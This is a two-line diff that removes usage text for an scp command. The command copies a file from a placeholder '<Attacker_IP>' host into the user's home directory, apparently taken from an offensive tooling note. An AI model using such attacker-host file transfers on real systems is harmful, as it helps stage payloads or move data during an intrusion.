@@ -1,2 +1,0 @@
-Usage:
-  scp <username>@<Attacker_IP>:<directory>/<filename> ~
